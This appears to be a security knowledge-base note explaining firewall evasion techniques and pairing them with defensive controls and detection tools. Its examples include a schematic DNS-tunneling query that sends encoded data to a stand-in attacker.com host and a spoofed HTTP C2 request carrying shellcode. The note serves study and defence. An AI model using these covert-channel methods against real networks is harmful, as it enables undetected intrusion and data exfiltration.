**Firewall evasion techniques** are methods used by attackers to bypass or defeat firewall controls in order to communicate with target systems, exfiltrate data, or establish Command and Control (C2) channels.

These tactics exploit **protocol weaknesses**, **misconfigurations**, and **trusted traffic patterns** to sneak past network boundaries undetected.

---

## 🎯 Objectives of Firewall Evasion

- Establish **covert communication channels**
- Evade **intrusion detection/prevention systems (IDS/IPS)**
- Bypass **egress filtering** and **packet inspection**
- Maintain **stealth and persistence** within segmented or monitored networks

---

## 🧠 Common Evasion Techniques

| Technique                       | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| **Protocol Tunneling**           | Encapsulating forbidden traffic in allowed protocols (e.g., DNS, HTTP)     |
| **Port Hopping**                 | Switching between ports to avoid detection or blocking                     |
| **Using Common Ports**           | Leveraging ports like 80/443 to blend in with normal traffic               |
| **Encryption (TLS/SSL)**         | Obscures payloads from deep packet inspection tools                        |
| **Domain Fronting**              | Using CDN or cloud infrastructure to disguise destination domains          |
| **Fragmentation**                | Splitting packets to avoid signature detection                             |
| **Polymorphism/Obfuscation**     | Modifying payloads to avoid matching known firewall rules or signatures    |
| **HTTP/S Mimicry**               | Making C2 traffic resemble web traffic (e.g., User-Agent spoofing)         |
| **Time-based Evasion (Low-and-Slow)** | Sends traffic intermittently to avoid rate-based rules                |

---

## 🔍 Examples

### DNS Tunneling (Command and Control)
```text
Attacker encodes data in DNS queries:
  malware -> aGVsbG9AMTI3LjAuMC4x.attacker.com
Firewall allows outbound UDP 53 → C2 established.
```

**Port Hopping**
```
First: 192.168.1.1:8080
Then: 192.168.1.1:443
Then: 192.168.1.1:12345
```

**HTTP Spoofed C2**
```
POST /login HTTP/1.1
Host: fake-login[.]com
User-Agent: Mozilla/5.0 (Windows NT 10.0...)
Payload: Encoded shellcode
```

## 🛡️ Defensive Strategies

|Control Type|Countermeasure|
|---|---|
|**Preventive**|Egress filtering, allowlisting, proxy enforcement|
|**Detective**|Deep Packet Inspection (DPI), traffic analysis, behavior analytics|
|**Corrective**|Quarantine, block suspicious IPs/domains, rotate firewall rules|
|**Compensating**|DNS sinkholing, zero trust network segmentation|

---

## 🧰 Detection Tools & Techniques

|Tool/Technique|Description|
|---|---|
|**Zeek/Bro**|Detects tunneling, HTTP anomalies, unusual DNS traffic|
|**Suricata/Snort**|Custom rules for port misuse and packet anomalies|
|**Firewall logs + SIEM**|Detect blocked attempts, rate anomalies, unusual destinations|
|**RITA**|Beaconing and DNS tunneling detection via Zeek logs|
|**Decryption/SSL Inspection**|Reveals malicious payloads inside HTTPS streams|

---

## ⚠️ Real-World Use Cases

|Threat Group / Malware|Technique Used|
|---|---|
|**APT29 (Cozy Bear)**|HTTPS C2 over port 443 + domain fronting|
|**Emotet**|Polymorphic payloads via HTTP POST|
|**Cobalt Strike**|Configurable C2 using HTTP/S, DNS, or SMB|
|**IcedID**|DNS beaconing + TLS encrypted channels|

---

## 📚 Related Topics

- [[DNS Tunneling]]
- [[Command and Control (C2)]]
- [[Beaconing Detection]]
- [[SIEM Tools]]
- [[Intrusion Detection Systems (IDS)]]
- [[Intrusion Prevention Systems (IPS)]]
- [[Zero Trust Architecture]]

---

## 🏷 Tags

#firewall_evasion #C2 #IDS #network_security #evasion_techniques #stealth #dns_tunneling #zero_trust #threat_detection